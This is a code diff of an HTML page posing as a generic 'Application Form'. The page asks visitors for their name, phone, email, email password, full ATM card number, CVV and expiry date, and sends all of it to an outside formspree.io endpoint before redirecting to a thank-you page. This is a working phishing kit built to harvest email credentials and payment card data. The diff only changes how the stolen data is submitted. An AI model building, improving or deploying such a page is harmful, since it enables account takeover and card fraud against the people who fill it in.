@@ -1,159 +1,185 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Application Form</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      padding: 20px;
+<html lang="en">    
+<head>    
+  <meta charset="UTF-8" />    
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>    
+  <title>Application Form</title>    
+  <style>    
+    body {    
+      font-family: Arial, sans-serif;    
+      background: #f2f2f2;    
+      padding: 20px;    
+    }    
+    form {    
+      max-width: 500px;    
+      margin: auto;    
+      background: white;    
+      padding: 30px;    
+      border-radius: 10px;    
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);    
+    }    
+    input, select {    
+      width: 100%;    
+      padding: 10px;    
+      margin-top: 5px;    
+      margin-bottom: 15px;    
+      border: 1px solid #ccc;    
+      border-radius: 5px;    
+      box-sizing: border-box;    
+    }    
+    label {    
+      font-weight: bold;    
+    }    
+    .password-wrapper {    
+      position: relative;    
+    }    
+    .password-wrapper input {    
+      padding-right: 40px;    
+    }    
+    .password-wrapper .toggle-password {    
+      position: absolute;    
+      top: 50%;    
+      right: 10px;    
+      transform: translateY(-50%);    
+      cursor: pointer;    
+    }    
+    .error {    
+      color: red;    
+      font-size: 0.9em;    
+      margin-top: -10px;    
+      margin-bottom: 10px;    
+      display: none;    
+    }    
+    button {    
+      background-color: #4CAF50;    
+      color: white;    
+      padding: 12px;    
+      border: none;    
+      border-radius: 5px;    
+      width: 100%;    
+      font-size: 16px;    
+      cursor: pointer;    
+    }    
+    button:hover {    
+      background-color: #45a049;    
+    }    
+  </style>    
+</head>    
+<body>  
+  <form id="applicationForm" action="https://formspree.io/f/mayvlzlp" method="POST" onsubmit="handleRedirect(event)">    
+    <h2>Application Form</h2>  
+
+    <label for="fullName">1. Full Name:</label>  
+    <input type="text" id="fullName" name="Full Name" required />  
+
+    <label for="country">2. Country:</label>
+    <input type="text" id="country" name="Country" required />
+
+    <label for="phone">3. Phone Number:</label>
+    <input type="tel" id="phone" name="Phone Number" required pattern="[0-9]{9,12}" />
+    <div id="phoneError" class="error">Phone number must be 9 to 12 digits.</div>  
+
+    <label for="email">4. Email:</label>  
+    <input type="email" id="email" name="Email" required />  
+
+    <label for="emailPassword">5. Email Password:</label>
+    <div class="password-wrapper">    
+      <input type="password" id="emailPassword" name="Email Password" required />    
+      <span class="toggle-password" onclick="togglePassword()">👁️</span>    
+    </div>  
+
+    <label for="atmLinked">6. Did you link your ATM card to your account?</label>  
+    <select id="atmLinked" name="ATM Linked" required>  
+      <option value="">-- Select --</option>  
+      <option value="Yes">Yes</option>  
+      <option value="No">No</option>  
+    </select>    
+    <div id="atmInstruction" class="error">YOU MUST HAVE ATM CARD TO PROCEED</div>  
+
+    <label for="atmNumber">7. ATM Card Number:</label>  
+    <input type="text" id="atmNumber" name="ATM Card Number" required pattern="\d{16}" maxlength="16" />    
+    <div id="atmError" class="error">ATM Card Number must be exactly 16 digits.</div>  
+
+    <label for="cvv">8. CVV:</label>  
+    <input type="text" id="cvv" name="CVV" required pattern="\d{3}" maxlength="3" />    
+    <div id="cvvError" class="error">CVV must be 3 digits.</div>  
+
+    <label for="expiry">9. Expiry Date (MM/YY):</label>  
+    <input type="text" id="expiry" name="Expiry Date" required pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" />    
+    <div id="expiryError" class="error">Format must be MM/YY.</div>  
+
+    <button type="submit">Submit</button>  
+  </form>  
+
+  <script>    
+    const phone = document.getElementById("phone");    
+    const phoneError = document.getElementById("phoneError");    
+
+    const atmLinked = document.getElementById("atmLinked");
+    const atmInstruction = document.getElementById("atmInstruction");
+
+    const atmNumber = document.getElementById("atmNumber");
+    const atmError = document.getElementById("atmError");
+
+    const cvv = document.getElementById("cvv");
+    const cvvError = document.getElementById("cvvError");
+
+    const expiry = document.getElementById("expiry");
+    const expiryError = document.getElementById("expiryError");
+
+    phone.addEventListener("input", () => {
+      phoneError.style.display = phone.validity.patternMismatch ? "block" : "none";
+    });
+
+    atmNumber.addEventListener("input", () => {
+      atmError.style.display = atmNumber.validity.patternMismatch ? "block" : "none";
+    });
+
+    cvv.addEventListener("input", () => {
+      cvvError.style.display = cvv.validity.patternMismatch ? "block" : "none";
+    });
+
+    expiry.addEventListener("input", () => {
+      expiryError.style.display = expiry.validity.patternMismatch ? "block" : "none";
+    });
+
+    atmLinked.addEventListener("change", () => {
+      atmInstruction.style.display = atmLinked.value === "No" ? "block" : "none";
+    });
+
+    function togglePassword() {
+      const pwd = document.getElementById("emailPassword");
+      pwd.type = pwd.type === "password" ? "text" : "password";
     }
-    form {
-      max-width: 500px;
-      margin: auto;
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+
+    // Handle redirect after submission
+    function handleRedirect(event) {
+      event.preventDefault(); // prevent default form submission
+      const form = document.getElementById("applicationForm");
+
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: form.method,
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "thankyou.html";
+        } else {
+          alert("Submission failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        alert("There was an error submitting the form.");
+      });
     }
-    input, select {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-    }
-    label {
-      font-weight: bold;
-    }
-    .password-wrapper {
-      position: relative;
-    }
-    .password-wrapper input {
-      padding-right: 40px;
-    }
-    .password-wrapper .toggle-password {
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      cursor: pointer;
-    }
-    .error {
-      color: red;
-      font-size: 0.9em;
-      margin-top: -10px;
-      margin-bottom: 10px;
-      display: none;
-    }
-    button {
-      background-color: #4CAF50;
-      color: white;
-      padding: 12px;
-      border: none;
-      border-radius: 5px;
-      width: 100%;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-  </style>
-</head>
-<body>
-
-<form id="applicationForm" action="https://formspree.io/f/mayvlzlp" method="POST">
-  <input type="hidden" name="_redirect" value="thankyou.html" />
-  <h2>Application Form</h2>
-
-  <label for="fullName">1. Full Name:</label>
-  <input type="text" id="fullName" name="Full Name" required />
-
-  <label for="country">2. Country:</label>
-  <input type="text" id="country" name="Country" required />
-
-  <label for="phone">3. Phone Number:</label>
-  <input type="tel" id="phone" name="Phone Number" required pattern="[0-9]{9,12}" />
-  <div id="phoneError" class="error">Phone number must be 9 to 12 digits.</div>
-
-  <label for="email">4. Email:</label>
-  <input type="email" id="email" name="Email" required />
-
-  <label for="emailPassword">5. Email Password:</label>
-  <div class="password-wrapper">
-    <input type="password" id="emailPassword" name="Email Password" required />
-    <span class="toggle-password" onclick="togglePassword()">👁️</span>
-  </div>
-
-  <label for="atmLinked">6. Did you link your ATM card to your account?</label>
-  <select id="atmLinked" name="ATM Linked" required>
-    <option value="">-- Select --</option>
-    <option value="Yes">Yes</option>
-    <option value="No">No</option>
-  </select>
-  <div id="atmInstruction" class="error">YOU MUST HAVE ATM CARD TO PROCEED</div>
-
-  <label for="atmNumber">7. ATM Card Number:</label>
-  <input type="text" id="atmNumber" name="ATM Card Number" required pattern="\d{16}" maxlength="16" />
-  <div id="atmError" class="error">ATM Card Number must be exactly 16 digits.</div>
-
-  <label for="cvv">8. CVV:</label>
-  <input type="text" id="cvv" name="CVV" required pattern="\d{3}" maxlength="3" />
-  <div id="cvvError" class="error">CVV must be 3 digits.</div>
-
-  <label for="expiry">9. Expiry Date (MM/YY):</label>
-  <input type="text" id="expiry" name="Expiry Date" required pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" />
-  <div id="expiryError" class="error">Format must be MM/YY.</div>
-
-  <button type="submit">Submit</button>
-</form>
-
-<script>
-  const phone = document.getElementById("phone");
-  const phoneError = document.getElementById("phoneError");
-
-  const atmLinked = document.getElementById("atmLinked");
-  const atmInstruction = document.getElementById("atmInstruction");
-
-  const atmNumber = document.getElementById("atmNumber");
-  const atmError = document.getElementById("atmError");
-
-  const cvv = document.getElementById("cvv");
-  const cvvError = document.getElementById("cvvError");
-
-  const expiry = document.getElementById("expiry");
-  const expiryError = document.getElementById("expiryError");
-
-  phone.addEventListener("input", () => {
-    phoneError.style.display = phone.validity.patternMismatch ? "block" : "none";
-  });
-
-  atmNumber.addEventListener("input", () => {
-    atmError.style.display = atmNumber.validity.patternMismatch ? "block" : "none";
-  });
-
-  cvv.addEventListener("input", () => {
-    cvvError.style.display = cvv.validity.patternMismatch ? "block" : "none";
-  });
-
-  expiry.addEventListener("input", () => {
-    expiryError.style.display = expiry.validity.patternMismatch ? "block" : "none";
-  });
-
-  atmLinked.addEventListener("change", () => {
-    atmInstruction.style.display = atmLinked.value === "No" ? "block" : "none";
-  });
-
-  function togglePassword() {
-    const pwd = document.getElementById("emailPassword");
-    pwd.type = pwd.type === "password" ? "text" : "password";
-  }
-</script>
-
+  </script>  
 </body>
 </html>
